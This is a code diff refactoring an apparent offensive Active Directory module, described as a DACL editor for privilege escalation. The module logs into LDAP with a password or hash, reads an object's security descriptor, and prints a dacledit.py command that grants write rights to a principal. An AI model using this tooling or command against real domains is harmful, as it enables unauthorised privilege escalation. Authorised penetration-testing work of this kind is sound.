@@ -1,5 +1,4 @@
-"""DACL editor — modify AD object DACLs for privilege escalation."""
-from __future__ import annotations
+"""DACL editor  -  modify AD object DACLs for privilege escalation."""
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -37,8 +36,7 @@ def run(args: Any) -> int:
         print("[!] --target-dn and --principal required", file=sys.stderr)
         return 1
 
-    print("[*] DACL {} → {} gets {} on {}".format(
-        action.upper(), principal, right, target_dn))
+    print(f"[*] DACL {action.upper()} → {principal} gets {right} on {target_dn}")
 
     try:
         from impacket.ldap import ldap as impacket_ldap
@@ -48,7 +46,7 @@ def run(args: Any) -> int:
         return 1
 
     try:
-        ldap_url = "ldap://{}".format(dc_ip)
+        ldap_url = f"ldap://{dc_ip}"
         ldap_conn = impacket_ldap.LDAPConnection(ldap_url, "DC=" + ",DC=".join(args.domain.split(".")))
 
         if cred.has_hash:
@@ -56,7 +54,7 @@ def run(args: Any) -> int:
         else:
             ldap_conn.login(cred.username, cred.password or "", cred.domain)
 
-        print("[+] Connected to LDAP on {}".format(dc_ip))
+        print(f"[+] Connected to LDAP on {dc_ip}")
 
         search = ldap_conn.search(
             searchBase=target_dn,
@@ -67,14 +65,13 @@ def run(args: Any) -> int:
         for entry in search:
             if hasattr(entry, "getComponentByName"):
                 sd_raw = entry["attributes"]["nTSecurityDescriptor"]
-                print("[+] Current SD retrieved ({} bytes)".format(len(sd_raw)))
-                print("[*] Modifying DACL: {} {} for {}".format(action, right, principal))
+                print(f"[+] Current SD retrieved ({len(sd_raw)} bytes)")
+                print(f"[*] Modifying DACL: {action} {right} for {principal}")
                 print("[!] Full DACL editing requires dacledit.py or bloodyAD")
-                print("[*] Tip: dacledit.py -action write -rights {} -principal {} -target {}".format(
-                    right.upper(), principal, target_dn))
+                print(f"[*] Tip: dacledit.py -action write -rights {right.upper()} -principal {principal} -target {target_dn}")
                 break
 
         return 0
     except Exception as exc:
-        print("[-] DACL edit error: {}".format(exc), file=sys.stderr)
+        print(f"[-] DACL edit error: {exc}", file=sys.stderr)
         return 1
